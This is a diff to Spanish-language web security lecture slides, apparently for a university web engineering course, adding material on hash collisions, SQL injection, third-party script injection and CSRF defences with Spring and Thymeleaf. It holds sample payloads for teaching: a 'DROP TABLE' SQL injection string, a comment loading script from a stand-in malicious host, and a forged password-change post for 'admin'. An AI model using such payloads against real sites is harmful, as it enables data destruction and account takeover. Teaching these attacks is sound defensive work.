@@ -90,9 +90,10 @@
     + **consistente**: $b_1 = b_2 \implies h(b_1) = h(b_2)$
     + longitud constante: $\forall b, |h(b)| = {n_h}$, \
     con ${h} típicamente entre 128 y 512 bits (16 a 64 bytes)
-* Como puede haber más claves ($2^{n_k}$) que hashes ($2^{n_h}$), habrá _colisiones_
+* Como puede haber más claves ($2^{n_k}$) que hashes ($2^{n_h}$), habrá\footnote{Teorema del palomar: si hay más palomas (posibles cadenas de bytes) que nidos (hashes), alguna paloma va a tener que compartir nido} _colisiones_
     + ¿cómo, tu contraseña no es de al menos 16 caracteres? \
-    (la mía tampoco; pero también es posible hashear cosas que no son contraseñas)
+    (la mía tampoco; pero también es posible hashear \
+    cosas que no son contraseñas)
     + colisión: $a \neq b \wedge h(a) = h(b)$ \
     "mismo resultado, a partir de cosas distintas"
 
@@ -188,7 +189,7 @@ Introducing: little [Bobby tables](http://bobby-tables.com/java.html)
 
 - - - 
 
-(99% de los usuarios)
+(99% de los usuarios no son malvados)
 
 ~~~{.java}
 login = "Robert"; // del formulario
@@ -207,7 +208,7 @@ SELECT * FROM Student WHERE login='Robert'
 \hrule
 \hspace{1cm}
 
-(1% de usuarios; profesor de IW)
+(1% de usuarios, incluyendo tu profesor)
 
 ~~~{.java}
 login = "Robert'; DROP TABLE Students;--"; // del formulario
@@ -363,6 +364,120 @@ var message =/*[[${message}]]*/ 'defaultanyvalue';
 //            |              |
 //            \--------------+-- sin ' ' entre comentario y corchetes
 ~~~
+
+## Evitando inyección de HTML/JS desde terceras páginas
+
+* vale, tu página puede no contener inyecciones. Pero, ¿y las de otros?
+
+* ¿Qué pasa si visitas un foro, y lees el comentario siguiente, y tu navegador ejectua ese JS?
+
+~~~{.html}
+¡Qué post tan bueno!<script src="http://servidormaligno.com/script.js"></script>
+~~~
+
+* Soluciones:
+
+- Navegadores modernos: 
+    + cabecera content-security-policy
+    + CORS
+    * X-Frame-Options
+
+## Protegiendo posts: CSRF
+
+* Cross-Site Request Forgery
+
+~~~~ {.html}
+<div>
+    // si eso lo lee el admin, está logeado, y el "endpoint" existe...
+    <script>$.post("cambiarPasswd", {u: "admin", p: "muahaha"});</script>
+</div>
+~~~~
+
+## Evitando CSRF
+
+* Uso de tókenes de sesión
+    + se genera en cada sesión, distinto para cada usuario, no-adivinable
+    + se incluye en cada petición CSRF (que __debe__ ser tipo POST)
+    + si token ausente o no válido, alerta: puede ser petición CSRF
+    
+- - -
+
+Generación y verificación del token:
+
+~~~~ {.java}
+// al logear a un usuario, antes de devolver la vista
+static String getTokenForSession (HttpSession session) {
+    String token=UUID.randomUUID().toString();
+    session.setAttribute("csrf_token", token);
+    return token;
+}
+
+// para comprobar si token valido, antes de hacer nada con los datos
+static boolean isTokenValid(HttpSession session, String token) {
+    String t=session.getAttribute("csrf_token");
+    return (t != null) && t.equals(token);
+}
+~~~~
+
+
+- - - 
+
+Uso del token en una consulta POST:
+
+~~~~ {.java}
+        /**
+         * Delete a user; return status indicating success or failure
+         */
+        @RequestMapping(value = "/delUser", method = RequestMethod.POST)
+        @ResponseBody
+        @Transactional // needed to allow DB change
+        public ResponseEntity<String> delUser(
+                @RequestParam("id") long id,
+                        @RequestParam("csrf") String token, 
+                        HttpSession session) {
+                if ( ! isAdmin(session) || ! isTokenValid(session, token)) {
+                        return new ResponseEntity<String>("Error: bad auth", 
+                                        HttpStatus.FORBIDDEN);
+                } else if (entityManager.createNamedQuery("delUser")
+                                .setParameter("idParam", id).executeUpdate() == 1) {
+                        return new ResponseEntity<String>("Ok: user " + id + " removed", 
+                                        HttpStatus.OK);
+                } else {
+                        return new ResponseEntity<String>("Error: no such user", 
+                                        HttpStatus.BAD_REQUEST);
+                }
+        }       
+~~~~
+
+- - - 
+
+En el formulario (si no usas Spring Security):
+
+~~~~ {.html}
+    <form action="http://bank.com/transferencia" method="POST">
+        ...
+        <input type="hidden" name="csrf" 
+            value="${e:forJavaScript(csrf_token)}"/>
+        ...
+    </form> 
+~~~~
+
+O en la petición AJAX:
+
+~~~~ {.html}
+    <script>
+        $.post("cambiarPasswd", 
+            {u: "admin", p: "algomuycomplicado", csrf: "${csrf_token}"});
+    </script>
+~~~~
+
+## Evitando CSRF con Spring Security & Thymeleaf
+
+* Spring Security se encarga de generar y validar el token csrf
+* Lo guarda en la sesión, y está disponible como `${_csrf}` desde Thymeleaf
+* Thymeleaf lo mete automáticamente en formularios con `method="post"`, siempre que haya un `th:action`
+
+* **OJO** si tu formulario es POST pero no usa Thymeleaf (por ejemplo, usas AJAX), *tienes que meter a mano* el token CSRF
 
 ## Vectores internos: ficheros
 
